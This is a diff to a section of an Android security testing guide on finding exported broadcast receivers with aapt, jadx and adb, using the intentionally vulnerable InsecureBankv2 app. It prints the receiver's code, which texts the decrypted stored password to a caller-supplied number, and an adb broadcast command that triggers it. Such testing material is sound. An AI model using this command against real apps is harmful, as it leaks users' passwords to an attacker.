@@ -1065,21 +1065,99 @@ Got a reply from com.mwr.example.sieve/com.mwr.example.sieve.AuthService:
 
 #### Broadcast Receivers
 
-Broadcasts can be enumerated via the Drozer module `app.broadcast.info`. The target package should be specified via the `-a` parameter:
+To list broadcast receivers exported by an application, you can use the following command and focus on `receiver` elements:
 
 ```bash
-dz> run app.broadcast.info -a com.android.insecurebankv2
-Package: com.android.insecurebankv2
-  com.android.insecurebankv2.MyBroadCastReceiver
-    Permission: null
+$ aapt d xmltree InsecureBankv2.apk AndroidManifest.xml
+...
+E: receiver (line=88)
+  A: android:name(0x01010003)="com.android.insecurebankv2.MyBroadCastReceiver" (Raw: "com.android.insecurebankv2.MyBroadCastReceiver")
+  A: android:exported(0x01010010)=(type 0x12)0xffffffff
+  E: intent-filter (line=91)
+    E: action (line=92)
+      A: android:name(0x01010003)="theBroadcast" (Raw: "theBroadcast")
+E: receiver (line=119)
+  A: android:name(0x01010003)="com.google.android.gms.wallet.EnableWalletOptimizationReceiver" (Raw: "com.google.android.gms.wallet.EnableWalletOptimizationReceiver")
+  A: android:exported(0x01010010)=(type 0x12)0x0
+  E: intent-filter (line=122)
+    E: action (line=123)
+      A: android:name(0x01010003)="com.google.android.gms.wallet.ENABLE_WALLET_OPTIMIZATION" (Raw: "com.google.android.gms.wallet.ENABLE_WALLET_OPTIMIZATION")
+...
 ```
 
-In the example app "Android Insecure Bank", one broadcast receiver is exported without requiring any permissions, indicating that we can formulate an intent to trigger the broadcast receiver. When testing broadcast receivers, you must also use static analysis to understand the functionality of the broadcast receiver, as we did before.
+You can identify an exported broadcast receiver using one of the following properties:
 
-With the Drozer module `app.broadcast.send`, we can formulate an intent to trigger the broadcast and send the password to a phone number within our control:
+- It have an `intent-filter` sub declaration.
+- It have the attribute `android:exported` to `0xffffffff`.
+
+You can also use [jadx](0x08-Testing-Tools.md#jadx "jadx") to identify exported broadcast receivers in the file `AndroidManifest.xml` using the criteria described above:
+
+```xml
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android" package="com.android.insecurebankv2">
+...
+  <!-- This broadcast receiver is exported via the attribute "exported" as well as the "intent-filter" declaration -->
+  <receiver android:name="com.android.insecurebankv2.MyBroadCastReceiver" android:exported="true">
+    <intent-filter>
+      <action android:name="theBroadcast"/>
+    </intent-filter>
+  </receiver>
+  <!-- This broadcast receiver is NOT exported because the attribute "exported" is explicitly set to false -->
+  <receiver android:name="com.google.android.gms.wallet.EnableWalletOptimizationReceiver" android:exported="false">
+    <intent-filter>
+      <action android:name="com.google.android.gms.wallet.ENABLE_WALLET_OPTIMIZATION"/>
+    </intent-filter>
+  </receiver>
+...
+</manifest>
+```
+
+Enumerating broadcast receivers in the vulnerable banking application [InsecureBankv2](0x08-Testing-Tools.md#android "Vulnerable applications for Android") shows that only the broadcast receiver named `com.android.insecurebankv2.MyBroadCastReceiver` is exported.
+
+You can use [jadx](0x08-Testing-Tools.md#jadx "jadx") to analyze the code of a broadcast receiver to identify potential vulnerabilities. The code of the exported broadcast receiver is the following:
+
+```java
+package com.android.insecurebankv2;
+...
+public class MyBroadCastReceiver extends BroadcastReceiver {
+    public static final String MYPREFS = "mySharedPreferences";
+    String usernameBase64ByteString;
+
+    public void onReceive(Context context, Intent intent) {
+        String phn = intent.getStringExtra("phonenumber");
+        String newpass = intent.getStringExtra("newpass");
+        if (phn != null) {
+            try {
+                SharedPreferences settings = context.getSharedPreferences("mySharedPreferences", 1);
+                this.usernameBase64ByteString = new String(Base64.decode(settings.getString("EncryptedUsername", (String) null), 0), "UTF-8");
+                String decryptedPassword = new CryptoClass().aesDeccryptedString(settings.getString("superSecurePassword", (String) null));
+                String textPhoneno = phn.toString();
+                String textMessage = "Updated Password from: " + decryptedPassword + " to: " + newpass;
+                SmsManager smsManager = SmsManager.getDefault();
+                System.out.println("For the changepassword - phonenumber: " + textPhoneno + " password is: " + textMessage);
+                smsManager.sendTextMessage(textPhoneno, (String) null, textMessage, (PendingIntent) null, (PendingIntent) null);
+            } catch (Exception e) {
+                e.printStackTrace();
+            }
+        } else {
+            System.out.println("Phone number is null");
+        }
+    }
+}
+```
+
+The broadcast receiver take two parameters named `phonenumber` and `newpass`.
+
+Use the following command to send a event to this broadcast receiver:
 
 ```bash
-dz>  run app.broadcast.send --action theBroadcast --extra string phonenumber 07123456789 --extra string newpass 12345
+# Send an event with the following properties:
+# Action is set to "theBroadcast"
+# Parameter "phonenumber" is set to the string "07123456789"
+# Parameter "newpass" is set to the string "12345"
+$ adb shell am broadcast -a theBroadcast --es phonenumber "07123456789" --es newpass "12345"
+Broadcasting: Intent { act=theBroadcast flg=0x400000 (has extras) }
+Broadcast completed: result=0
 ```
 
 This generates the following SMS:
